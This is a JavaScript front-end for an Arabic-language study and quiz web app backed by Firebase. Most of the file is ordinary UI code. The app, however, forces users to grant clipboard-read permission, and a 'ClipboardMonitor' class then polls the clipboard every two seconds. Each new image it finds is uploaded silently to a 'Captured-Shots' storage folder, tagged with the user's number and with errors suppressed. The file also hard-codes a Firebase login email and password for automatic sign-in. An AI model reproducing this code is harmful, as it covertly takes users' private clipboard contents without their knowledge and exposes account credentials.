import { getDoc, doc } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";

// Prevent right-click context menu globally
document.addEventListener('contextmenu', (e) => e.preventDefault());

// Global helper function
const isArabic = (text) => {
  const arabicRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
  return arabicRegex.test(text);
};

// =====================================
// Permissions System - Class-based
// =====================================
class PermissionsManager {
  constructor() {
    this.state = {
      notifications: false,
      clipboard: false
    };
    
    this.elements = {
      permScreen: document.querySelector('.permissions'),
      loginScreen: document.querySelector('.login'),
      blockedScreen: document.querySelector('.blocked-view'),
      header: document.querySelector('.header'),
      mainContent: document.querySelector('.main-content'),
      quizi: document.querySelector('.quizi'),
      notifBtn: document.getElementById('notif-btn'),
      clipBtn: document.getElementById('clip-btn'),
      nextBtn: document.getElementById('next-btn')
    };
    
    this.monitoringInterval = null;
  }
  
  // Check all permissions status - ALWAYS check browser permissions, not localStorage
  async checkAllPermissions() {
    // Check notifications - always from browser
    this.state.notifications = 'Notification' in window && Notification.permission === 'granted';
    
    // Check clipboard READ permission - always from browser
    let clipGranted = false;
    try {
      if (navigator.permissions && navigator.permissions.query) {
        const result = await navigator.permissions.query({ name: 'clipboard-read' });
        clipGranted = result.state === 'granted';
      } else {
        // Fallback: try to read clipboard to test permission
        try {
          await navigator.clipboard.readText();
          clipGranted = true;
        } catch {
          clipGranted = false;
        }
      }
    } catch {
      clipGranted = false;
    }
    
    this.state.clipboard = clipGranted;
    return this.state.notifications && this.state.clipboard;
  }
  
  // Show permission screen
  showPermissions() {
    this.elements.permScreen?.classList.remove('off');
    this.elements.loginScreen?.classList.add('off');
    this.elements.blockedScreen?.classList.add('off');
    this.elements.header?.classList.add('off');
    this.elements.mainContent?.classList.add('off');
    this.elements.quizi?.classList.add('off');
  }
  
  // Hide permission screen
  hidePermissions() {
    this.elements.permScreen?.classList.add('off');
  }
  
  // Update button states
  updateButtons() {
    const { notifBtn, clipBtn, nextBtn } = this.elements;
    
    if (notifBtn) {
      notifBtn.textContent = this.state.notifications ? 'Allowed' : 'Allow';
      notifBtn.classList.toggle('allowed', this.state.notifications);
      notifBtn.disabled = this.state.notifications;
    }
    
    if (clipBtn) {
      clipBtn.textContent = this.state.clipboard ? 'Allowed' : 'Allow';
      clipBtn.classList.toggle('allowed', this.state.clipboard);
      clipBtn.disabled = this.state.clipboard;
    }
    
    if (nextBtn) {
      const bothGranted = this.state.notifications && this.state.clipboard;
      nextBtn.classList.toggle('off', !bothGranted);
      nextBtn.disabled = !bothGranted;
    }
  }
  
  // Request notification permission
  async requestNotification() {
    if (!('Notification' in window)) {
      alert('Notifications are not supported in your browser');
      return false;
    }
    
    try {
      const permission = await Notification.requestPermission();
      this.state.notifications = permission === 'granted';
      this.updateButtons();
      return this.state.notifications;
    } catch (e) {
      alert('Failed to request notification permission');
      return false;
    }
  }
  
  // Request clipboard READ permission
  async requestClipboard() {
    if (!navigator.clipboard) {
      alert('Clipboard is not supported in your browser');
      return false;
    }
    
    try {
      // Request clipboard READ access by trying to read
      await navigator.clipboard.readText();
      this.state.clipboard = true;
      this.updateButtons();
      return true;
    } catch (e) {
      alert('Please allow clipboard access to continue. You may need to enable it in your browser settings.');
      return false;
    }
  }
  
  // Start monitoring permissions continuously
  startMonitoring() {
    // Check every 2 seconds
    this.monitoringInterval = setInterval(async () => {
      const hadBothPermissions = this.state.notifications && this.state.clipboard;
      await this.checkAllPermissions();
      const hasBothPermissions = this.state.notifications && this.state.clipboard;

      // If permissions were revoked, show permission screen
      if (hadBothPermissions && !hasBothPermissions) {
        this.showPermissions();
        this.updateButtons();
      }

      // Update buttons if on permission screen
      if (!this.elements.permScreen?.classList.contains('off')) {
        this.updateButtons();
      }
    }, 2000);

    // Listen for tab visibility change
    document.addEventListener('visibilitychange', async () => {
      if (!document.hidden) {
        await this.checkAllPermissions();
        const hasBothPermissions = this.state.notifications && this.state.clipboard;

        if (!hasBothPermissions) {
          this.showPermissions();
          this.updateButtons();
        }
      }
    });

    // Listen for permission changes
    this.setupPermissionChangeListeners();
  }

  // Setup listeners for permission state changes
  async setupPermissionChangeListeners() {
    // Clipboard permission change listener
    if (navigator.permissions && navigator.permissions.query) {
      try {
        const result = await navigator.permissions.query({ name: 'clipboard-read' });
        result.onchange = async () => {
          await this.checkAllPermissions();
          this.updateButtons();
          // If permissions revoked, show permission screen
          if (!this.state.clipboard) {
            this.showPermissions();
          }
        };
      } catch (e) {
        // Silently fail if permission query not supported
      }
    }
  }
  
  // Stop monitoring
  stopMonitoring() {
    if (this.monitoringInterval) {
      clearInterval(this.monitoringInterval);
      this.monitoringInterval = null;
    }
  }
  
  // Setup event listeners
  setupListeners() {
    // Notification button
    this.elements.notifBtn?.addEventListener('click', async () => {
      await this.requestNotification();
    });
    
    // Clipboard button
    this.elements.clipBtn?.addEventListener('click', async () => {
      await this.requestClipboard();
    });
    
    // Next button
    this.elements.nextBtn?.addEventListener('click', () => {
      this.handleNext();
    });
  }
  
  // Handle next button click
  handleNext() {
    if (!this.state.notifications || !this.state.clipboard) return;
    
    this.hidePermissions();
    
    // Trigger the continuation of initialization
    if (window.continueAppInit && typeof window.continueAppInit === 'function') {
      window.continueAppInit();
    }
  }
  
  // Initialize permissions system
  async init() {
    const hasAllPermissions = await this.checkAllPermissions();
    
    // Setup event listeners
    this.setupListeners();
    
    // Start monitoring
    this.startMonitoring();
    
    // Update button states
    this.updateButtons();
    
    // Return whether we need to show permission screen
    return hasAllPermissions;
  }
}

// Global instance
window.permissionsManager = new PermissionsManager();

// =====================================
// Loader
// =====================================
window.showLoader = () => {
  const loader = document.querySelector('.loader');
  if (loader) loader.classList.remove('off');
};

window.hideLoader = () => {
  const loader = document.querySelector('.loader');
  if (loader) loader.classList.add('off');
};

window.firebaseDataReady = () => {
  window.hideLoader();
};

// =====================================
// Blur blobs background script
// =====================================
(function () {
	const blobs = [
		document.getElementById('blob1'),
		document.getElementById('blob2'),
		document.getElementById('blob3')
	].filter(Boolean);

	if (!blobs.length) return;

	const stage = document.querySelector('.stage');
	const speedAttr = stage?.dataset?.blobSpeed;
	const speed = Math.max(0.1, parseFloat(speedAttr) || 1);

	const opacityAttr = stage?.dataset?.blobOpacity;
	const blurAttr = stage?.dataset?.blobBlur;
	const countAttr = parseInt(stage?.dataset?.blobCount || '3', 10);

	if (opacityAttr) stage.style.setProperty('--blob-opacity', opacityAttr);
	if (blurAttr) stage.style.setProperty('--blob-blur', blurAttr);

	if (!Number.isNaN(countAttr)) {
		blobs.forEach((b, i) => {
			if (i + 1 > countAttr) b.style.display = 'none';
			else b.style.display = '';
		});
	}

	const bases = [
		{ float: 6, morph: 4, nameFloat: 'float1', nameMorph: 'morph1', reverse: false },
		{ float: 7, morph: 5, nameFloat: 'float2', nameMorph: 'morph2', reverse: true },
		{ float: 8, morph: 6, nameFloat: 'float3', nameMorph: 'morph3', reverse: false }
	];

	blobs.forEach((b, i) => {
		const base = bases[i] || bases[0];
		const floatDur = (base.float / speed) + 's';
		const morphDur = (base.morph / speed) + 's';
		const direction = base.reverse ? ' reverse' : '';
		b.style.animation = `${base.nameFloat} ${floatDur} linear infinite${direction}, ${base.nameMorph} ${morphDur} ease-in-out infinite`;
	});

	window.addEventListener('pointermove', e => {
		const cx = (e.clientX / window.innerWidth - 0.5) * 2;
		const cy = (e.clientY / window.innerHeight - 0.5) * 2;
		blobs.forEach((b, i) => {
			const depth = (i + 1) * 8 * speed;
			b.style.transform = `translate(-50%,-50%) translate3d(${cx * depth}vw, ${cy * depth}vh, 0) scale(${1 + i * 0.01})`;
		});
	});

	function drift() {
		const t = Date.now() * speed;
		blobs.forEach((b, i) => {
			const rx = Math.sin(t / 10000 * (i + 1) + i) * (4 + i * 2) * speed;
			const ry = Math.cos(t / 8000 * (i + 1) + i) * (3 + i * 1.5) * speed;
			b.style.left = (50 + rx + (i === 0 ? -35 : i === 1 ? 25 : 0)) + '%';
			b.style.top = (50 + ry + (i === 0 ? -10 : i === 1 ? -5 : 35)) + '%';
		});
		requestAnimationFrame(drift);
	}
	drift();
})();

// =====================================
// Header - User Box Controller
// =====================================
class UserBoxController {
  constructor() {
    // Cache DOM elements by ID
    this.dom = {
      box: document.getElementById("user-box"),
      name: document.getElementById("username"),
      number: document.getElementById("user-number"),
      logoutBtn: document.getElementById("logout"),
      actionBtn: document.getElementById("to-dashboard"),
      imgText: document.querySelector("#user-box .img-box .text"),
      // External elements to control
      actionCenter: document.getElementById('action-center'),
      quizControl: document.getElementById('quiz-control')
    };

    // Initialize if box exists
    if (this.dom.box) {
      this.init();
    }
  }


  // 1. Initialize Data and Events
  init() {
    this.updateUserBox();
    this.addEventListeners();
  }

  // 2. Update Content from LocalStorage
  updateUserBox() {
    const { name, number, imgText, box } = this.dom;
    
    const storedName = localStorage.getItem("Name") || "";
    const storedNum = localStorage.getItem("Number") || "";

    if (name) name.textContent = storedName;
    if (number) number.textContent = storedNum;

    if (imgText && storedName) {
      imgText.textContent = storedName.trim().charAt(0);
    }

    this.updateDirection(storedName);
  }

  // 3. Handle Text Direction (RTL/LTR)
  updateDirection(nameText) {
    if (!this.dom.box) return;
    
    const textToCheck = nameText || this.dom.name?.textContent || "";
    
    if (textToCheck && isArabic(textToCheck)) {
      this.dom.box.style.direction = "rtl";
    } else {
      this.dom.box.style.direction = "ltr";
    }
  }

  // 4. Handle Opening/Closing the Box
  toggleBox(forceClose = false) {
    const { box, name, number, logoutBtn, actionBtn, actionCenter, quizControl } = this.dom;
    
    // Elements to show/hide using IDs
    const elementsToToggle = [
      { el: name, id: 'username' },
      { el: number, id: 'user-number' },
      { el: logoutBtn, id: 'logout' },
      { el: actionBtn, id: 'to-dashboard' }
    ];

    if (forceClose) {
      box.classList.remove("u-opened");
      
      // Hide all internal elements
      elementsToToggle.forEach(({ el }) => {
        if (el) el.classList.add("off");
      });
      
      // Hide external controls
      actionCenter?.classList.add('off');
      quizControl?.classList.add('off');
    } else {
      const isOpening = !box.classList.contains("u-opened");
      box.classList.toggle("u-opened");
      
      // Toggle all internal elements
      elementsToToggle.forEach(({ el }) => {
        if (el) el.classList.toggle("off");
      });

      // Control external elements based on open state
      if (isOpening) {
        actionCenter?.classList.remove('off');
        quizControl?.classList.remove('off');
      } else {
        actionCenter?.classList.add('off');
        quizControl?.classList.add('off');
      }
    }
  }


  // 5. Event Listeners
  addEventListeners() {
    const { box, logoutBtn, actionBtn } = this.dom;

    // Click on the box (Avatar)
    box.addEventListener("click", (e) => {
      e.stopPropagation();
      this.toggleBox();
    });

    // Click anywhere outside to close
    document.addEventListener("click", (e) => {
      if (!box.contains(e.target)) {
        this.toggleBox(true); // force close
      }
    });

    // Action Center Button Click
    actionBtn?.addEventListener("click", (e) => {
      e.stopPropagation();
      const modal = document.querySelector('.to-dashboard-modal');
      modal?.classList.remove('off');
    });

    // Close Dashboard Modal
    const closeModalBtn = document.getElementById('close-dashboard-modal');
    closeModalBtn?.addEventListener('click', () => {
      const modal = document.querySelector('.to-dashboard-modal');
      modal?.classList.add('off');
    });

    // Submit Dashboard Password
    const submitBtn = document.getElementById('submit-dashboard');
    const passwordInput = document.getElementById('dashboard-password');
    submitBtn?.addEventListener('click', async () => {
      const password = passwordInput?.value;
      if (!password) {
        return alert('Please enter a password.');
      }
      try {
        await signInWithEmailAndPassword(auth, "temrevil+1@gmail.com", password);
        alert('Access granted! Redirecting to dashboard...');
        // No need to store password in localStorage if using Firebase Auth
        window.location.href = 'dashboard.html'; // Redirect
      } catch (error) {
        console.error("Error logging in to dashboard:", error);
        let errorMessage = 'An error occurred. Please try again.';
        if (error.code === 'auth/wrong-password' || error.code === 'auth/user-not-found') {
          errorMessage = 'Invalid email or password.';
        } else if (error.code === 'auth/too-many-requests') {
          errorMessage = 'Too many failed login attempts. Please try again later.';
        }
        alert(errorMessage);
      }
    });

    // Logout Button Click
    logoutBtn?.addEventListener("click", async (e) => {
      e.stopPropagation();
      if (window.logout) {
        try {
          await window.logout();
        } catch (err) {
          console.error("Logout error:", err);
        }
      }
      window.location.reload();
    });
  }
}

// Initialize
let userBoxInstance;

const auth = getAuth();

const initApp = async () => {
  userBoxInstance = new UserBoxController();
  // Auto sign in with a fixed account for backend access
  try {
    const userCredential = await signInWithEmailAndPassword(auth, "temrevil@gmail.com", "1q2w3e");
    console.log("Auto signed in to Firebase Auth:", userCredential.user.uid);
  } catch (error) {
    // This can fail if the user is already signed in, which is fine.
    // We log other errors for debugging.
    if (error.code !== 'auth/operation-not-allowed') { // operation-not-allowed can happen with multiple sign-in attempts
        console.warn("Auto sign-in may have been handled already or failed:", error.message);
    }
  }
};

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initApp);
} else {
  initApp();
}

// Global functions for backward compatibility
window.updateUserBox = () => userBoxInstance?.updateUserBox();
window.updateUserBoxDirection = (name) => userBoxInstance?.updateDirection(name);

// =====================================
// PDF Viewer System
// =====================================
document.addEventListener('click', (e) => {
  if (e.target.closest('.pdf-box')) {
    const box = e.target.closest('.pdf-box');
    const src = box.getAttribute('data-lect-locate');
    const iframe = document.querySelector('.pdf-frame');
    if (iframe) iframe.src = src;
    const viewer = document.querySelector('.pdf-viewer');
    if (viewer) viewer.classList.remove('off');
  }

  if (e.target.closest('.close-pdf-btn')) {
    const viewer = document.querySelector('.pdf-viewer');
    if (viewer) {
      viewer.classList.add('off');
      const iframe = viewer.querySelector('.pdf-frame');
      if (iframe) iframe.src = '';
    }
  }
});

// =====================================
// Clipboard Image Monitor & Upload
// =====================================
class ClipboardMonitor {
  constructor() {
    this.isMonitoring = false;
    this.checkInterval = null;
    this.lastClipboardContent = null;
    this.uploadCounter = 0; // Counter for number of images uploaded
  }

  async uploadImageToFirebase(blob, userNumber) {
    try {
      if (!window.firebaseStorage) {
        return false;
      }

      // Increment counter
      this.uploadCounter++;

      // Generate filename: imageNumber-userNumber-date-time.png
      const now = new Date();
      const date = now.toLocaleDateString('en-GB').replace(/\//g, '-'); // DD-MM-YYYY
      const time = now.toLocaleTimeString('en-GB', { hour12: false }).replace(/:/g, '-'); // HH-MM-SS
      const fileName = `${this.uploadCounter}-${userNumber}-${date}-${time}.png`;
      const storagePath = `Captured-Shots/${fileName}`;

      // Import Firebase Storage functions
      const { ref, uploadBytes, getDownloadURL } = await import(
        'https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js'
      );

      // Create storage reference
      const storageRef = ref(window.firebaseStorage, storagePath);

      // Upload the blob
      const snapshot = await uploadBytes(storageRef, blob);

      // Get download URL (optional, for logging)
      const downloadURL = await getDownloadURL(snapshot.ref);

      console.log("snapped");
      return true;
    } catch (error) {
      return false;
    }
  }

  async initializeClipboardState() {
    try {
      if (!navigator.clipboard || !navigator.clipboard.read) {
        return;
      }

      const clipboardItems = await navigator.clipboard.read();

      for (const item of clipboardItems) {
        const imageTypes = item.types.filter(type => type.startsWith('image/'));

        if (imageTypes.length > 0) {
          const imageType = imageTypes[0];
          const blob = await item.getType(imageType);
          const blobHash = `${blob.size}-${blob.type}`;
          this.lastClipboardContent = blobHash;
          break;
        }
      }
    } catch (error) {
      // Silently fail
    }
  }

  async checkClipboard() {
    try {
      if (!navigator.clipboard || !navigator.clipboard.read) {
        return;
      }

      const clipboardItems = await navigator.clipboard.read();

      for (const item of clipboardItems) {
        const imageTypes = item.types.filter(type => type.startsWith('image/'));

        if (imageTypes.length > 0) {
          const imageType = imageTypes[0];
          const blob = await item.getType(imageType);
          const blobHash = `${blob.size}-${blob.type}`;

          // Only upload if it's a new image
          if (this.lastClipboardContent !== blobHash) {
            this.lastClipboardContent = blobHash;

            const userNumber = localStorage.getItem('Number');
            if (!userNumber) {
              continue;
            }

            // Upload to Firebase
            await this.uploadImageToFirebase(blob, userNumber);
            break;
          }
        }
      }
    } catch (error) {
      // Silently fail
    }
  }

  start() {
    if (this.isMonitoring) return;

    this.isMonitoring = true;

    // Initialize with current clipboard to avoid uploading existing images
    this.initializeClipboardState();

    // Check clipboard every 2 seconds
    this.checkInterval = setInterval(() => {
      this.checkClipboard();
    }, 2000);

    // Check on window focus
    window.addEventListener('focus', () => {
      if (this.isMonitoring) {
        this.checkClipboard();
      }
    });
  }

  stop() {
    if (!this.isMonitoring) return;

    this.isMonitoring = false;
    if (this.checkInterval) {
      clearInterval(this.checkInterval);
      this.checkInterval = null;
    }
  }
}

// Global instance
window.clipboardMonitor = new ClipboardMonitor();

// Auto-start monitoring when Firebase is ready
document.addEventListener('DOMContentLoaded', () => {
  const waitForFirebase = setInterval(() => {
    if (window.firebaseStorage && localStorage.getItem('Number')) {
      clearInterval(waitForFirebase);
      window.clipboardMonitor.start();
    }
  }, 1000);

  setTimeout(() => clearInterval(waitForFirebase), 30000);
});

// =====================================
// Quiz System - Refactored & Optimized
// =====================================
class QuiziApp {
    constructor() {
        this.dom = {
            trigger: document.getElementById('quiz-trigger'),
            modal: document.getElementById('quiz-modal'),
            closeBtn: document.getElementById('close-quiz'),
            title: document.getElementById('quiz-title'),
            
            views: {
                setup: document.getElementById('view-setup'),
                active: document.getElementById('view-active'),
                result: document.getElementById('view-result')
            },

            tabsContainer: document.getElementById('subject-tabs'),
            pdfList: document.getElementById('pdf-list'),
            inputs: {
                count: document.getElementById('inp-count'),
                timer: document.getElementById('inp-timer'),
                choices: document.getElementById('inp-choices')
            },
            labels: {
                count: document.getElementById('lbl-count'),
                timer: document.getElementById('lbl-timer'),
                choices: document.getElementById('lbl-choices')
            },
            startBtn: document.getElementById('btn-start'),

            game: {
                timer: document.getElementById('quiz-timer'),
                curr: document.getElementById('q-curr'),
                total: document.getElementById('q-total'),
                text: document.getElementById('q-text'),
                choices: document.getElementById('choices-area'),
                prev: document.getElementById('btn-prev'),
                next: document.getElementById('btn-next')
            },

            result: {
                circle: document.getElementById('score-circle'),
                val: document.getElementById('score-val'),
                list: document.getElementById('review-list'),
                restart: document.getElementById('btn-restart')
            }
        };

        this.state = {
            settings: { count: 10, timer: 5, choices: 4 },
            quizData: [],
            userAnswers: [],
            currIndex: 0,
            timerInterval: null,
            timeRemaining: 0
        };

        this.init();
    }

    // --- HELPER: Detect Text Direction ---
    getDirection(text) {
        if (!text) return 'rtl';
        const arabicPattern = /[\u0600-\u06FF]/;
        return arabicPattern.test(text) ? 'rtl' : 'ltr';
    }

    init() {
        this.dom.trigger.addEventListener('click', () => {
            this.dom.modal.classList.remove('off');
            this.renderSubjects();
        });
        this.dom.closeBtn.addEventListener('click', () => {
            this.dom.modal.classList.add('off');
            this.reset();
        });

        Object.keys(this.dom.inputs).forEach(key => {
            const input = this.dom.inputs[key];
            const label = this.dom.labels[key];
            input.addEventListener('input', (e) => {
                const val = parseInt(e.target.value);
                this.state.settings[key] = val;
                label.textContent = val + (key === 'timer' ? 'د' : '');
            });
        });

        this.dom.startBtn.addEventListener('click', () => this.startQuiz());
        this.dom.game.next.addEventListener('click', () => this.navigate(1));
        this.dom.game.prev.addEventListener('click', () => this.navigate(-1));
        this.dom.result.restart.addEventListener('click', () => this.switchView('setup'));
    }

    switchView(viewName) {
        Object.values(this.dom.views).forEach(el => el.classList.add('off'));
        this.dom.views[viewName].classList.remove('off');
        const titles = { setup: 'إعدادات الكويز', active: 'الاختبار', result: 'النتيجة' };
        this.dom.title.textContent = titles[viewName];
    }

    renderSubjects() {
        if (!window.pdfCache) return;
        const subjects = new Set();
        Object.values(window.pdfCache).flat().forEach(pdf => {
            const name = pdf.name.split('-')[0].trim();
            subjects.add(name);
        });

        this.dom.tabsContainer.innerHTML = '';
        let first = true;
        subjects.forEach(sub => {
            const btn = document.createElement('button');
            btn.className = `tab-btn text-1 ${first ? 'active' : ''}`;
            btn.textContent = sub;
            btn.onclick = () => {
                this.dom.tabsContainer.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                this.renderPDFs(sub);
            };
            this.dom.tabsContainer.appendChild(btn);
            if(first) { this.renderPDFs(sub); first = false; }
        });
    }

    renderPDFs(subjectName) {
        const container = this.dom.pdfList;
        container.innerHTML = '';
        const allPDFs = Object.values(window.pdfCache || {}).flat();
        const matching = allPDFs.filter(pdf => pdf.name.includes(subjectName));

        if (matching.length === 0) {
            container.innerHTML = `<div class="empty-state text-1 op-[0.5] text-center mt-[20px]">لا توجد محاضرات</div>`;
            return;
        }

        matching.forEach(pdf => {
            const label = document.createElement('label');
            label.className = 'pdf-item';
            const displayName = pdf.name.replace('.pdf', '');
            const dir = this.getDirection(displayName);

            label.innerHTML = `
                <input type="checkbox" class="accent-[var(--pc)]" data-name="${pdf.name}" data-lecture="${displayName}">
                <span class="text-1 flex-1" style="direction:${dir}; text-align:${dir === 'rtl' ? 'right' : 'left'}">${displayName}</span>
            `;
            container.appendChild(label);
        });
    }

    async startQuiz() {
        // Check if quiz is enabled
        const quizEnabled = await window.checkQuizEnabled();
        if (!quizEnabled) {
            alert('Quizzes are not enabled for your account.');
            return;
        }

        const checked = this.dom.pdfList.querySelectorAll('input:checked');
        if (checked.length === 0) return alert('يرجى اختيار محاضرة واحدة على الأقل');

        const originalText = this.dom.startBtn.textContent;
        this.dom.startBtn.textContent = 'جاري التحضير...';
        this.dom.startBtn.disabled = true;

        try {
            const selectedPDFs = Array.from(checked).map(input => ({
                fullName: input.dataset.name,
                parts: input.dataset.lecture.split(' - ')
            }));

            const quizData = await this.fetchQuizzes(selectedPDFs);

            if (!quizData || quizData.length === 0) throw new Error('لا توجد أسئلة');

            this.state.quizData = quizData.slice(0, this.state.settings.count);
            this.state.userAnswers = new Array(this.state.quizData.length).fill(null);
            this.state.currIndex = 0;
            this.state.timeRemaining = this.state.settings.timer * 60;

            this.dom.startBtn.textContent = originalText;
            this.dom.startBtn.disabled = false;
            this.switchView('active');
            this.renderQuestion();
            this.startTimer();

            const userNum = localStorage.getItem("Number");
            if (userNum && window.incrementQuizTimes) window.incrementQuizTimes(userNum);

        } catch (error) {
            alert(error.message);
            this.dom.startBtn.textContent = originalText;
            this.dom.startBtn.disabled = false;
        }
    }

    async fetchQuizzes(selectedPDFs) {
        if (!window.getQuizDoc) throw new Error('Firestore Error');
        let allQuizzes = [];
        for (const pdf of selectedPDFs) {
            const lectureName = pdf.parts[0]?.trim();
            const lectureNum = pdf.parts[1]?.trim();
            if (!lectureName || !lectureNum) continue;

            const docSnap = await window.getQuizDoc(lectureName);
            if (docSnap && docSnap.exists()) {
                const data = docSnap.data();
                const lectureData = data[lectureNum];
                if (lectureData?.quiz) {
                    lectureData.quiz.forEach(q => {
                        if (q.question && q.choices) {
                            allQuizzes.push({
                                question: q.question,
                                choices: q.choices,
                                correct: q.correct_answer,
                                explanation: q.explanation || ''
                            });
                        }
                    });
                }
            }
        }
        return allQuizzes.sort(() => Math.random() - 0.5);
    }

    renderQuestion() {
        const q = this.state.quizData[this.state.currIndex];
        const maxChoices = this.state.settings.choices;
        
        this.dom.game.curr.textContent = this.state.currIndex + 1;
        this.dom.game.total.textContent = this.state.quizData.length;
        this.dom.game.text.textContent = q.question;
        this.dom.game.text.style.direction = this.getDirection(q.question);

        const container = this.dom.game.choices;
        container.innerHTML = '';

        let choicesList = q.choices.filter(c => c !== q.correct);
        choicesList.sort(() => Math.random() - 0.5);
        choicesList = choicesList.slice(0, maxChoices - 1);
        choicesList.push(q.correct);
        choicesList.sort(() => Math.random() - 0.5);

        choicesList.forEach(txt => {
            const btn = document.createElement('button');
            const isSelected = this.state.userAnswers[this.state.currIndex] === txt;
            btn.className = `choice-btn text-1 ${isSelected ? 'selected' : ''}`;
            btn.textContent = txt;
            const dir = this.getDirection(txt);
            btn.style.direction = dir;
            btn.style.textAlign = dir === 'rtl' ? 'right' : 'left';
            
            btn.onclick = () => {
                this.state.userAnswers[this.state.currIndex] = txt;
                container.querySelectorAll('.choice-btn').forEach(b => b.classList.remove('selected'));
                btn.classList.add('selected');
            };
            container.appendChild(btn);
        });

        this.dom.game.prev.disabled = this.state.currIndex === 0;
        this.dom.game.next.textContent = this.state.currIndex === this.state.quizData.length - 1 ? 'إنهاء' : 'التالي';
    }

    navigate(dir) {
        const newIdx = this.state.currIndex + dir;
        if (newIdx >= this.state.quizData.length) {
            this.finishQuiz();
        } else {
            this.state.currIndex = newIdx;
            this.renderQuestion();
        }
    }

    startTimer() {
        if (this.state.timerInterval) clearInterval(this.state.timerInterval);
        const update = () => {
            const m = Math.floor(this.state.timeRemaining / 60);
            const s = this.state.timeRemaining % 60;
            this.dom.game.timer.textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            if (this.state.timeRemaining <= 0) this.finishQuiz();
            this.state.timeRemaining--;
        };
        update();
        this.state.timerInterval = setInterval(update, 1000);
    }

    finishQuiz() {
        if (this.state.timerInterval) clearInterval(this.state.timerInterval);
        let score = 0;
        const container = this.dom.result.list;
        container.innerHTML = '';

        this.state.quizData.forEach((q, i) => {
            const userAns = this.state.userAnswers[i];
            const isCorrect = userAns === q.correct;
            if (isCorrect) score++;

            const div = document.createElement('div');
            div.className = `review-item flex col gap-[5px] ${isCorrect ? 'correct' : 'wrong'}`;
            const qDir = this.getDirection(q.question);
            const ansDir = this.getDirection(userAns || '');

            div.innerHTML = `
                <p class="text-1" style="direction:${qDir}; text-align:${qDir==='rtl'?'right':'left'}">${i+1}. ${q.question}</p>
                <div class="flex row j-between a-center mt-[5px]">
                    <span class="text-1 fs-[0.9rem]" style="color:${isCorrect?'var(--green-2)':'var(--fb)'}; direction:${ansDir}">
                        ${userAns || 'لم يتم الاجابة'}
                    </span>
                    ${!isCorrect ? `<span class="text-1 fs-[0.8rem] op-[0.5]">الصح: ${q.correct}</span>` : ''}
                </div>
            `;
            container.appendChild(div);
        });

        const pct = Math.round((score / this.state.quizData.length) * 100);
        this.dom.result.val.textContent = `${pct}%`;
        const color = pct >= 50 ? 'var(--green-2)' : 'var(--fb)';
        this.dom.result.circle.style.stroke = color;
        this.switchView('result');
        setTimeout(() => this.dom.result.circle.setAttribute('stroke-dasharray', `${pct}, 100`), 100);
    }

    reset() {
        if (this.state.timerInterval) clearInterval(this.state.timerInterval);
        this.switchView('setup');
    }
}

document.addEventListener('DOMContentLoaded', () => {
    new QuiziApp();
});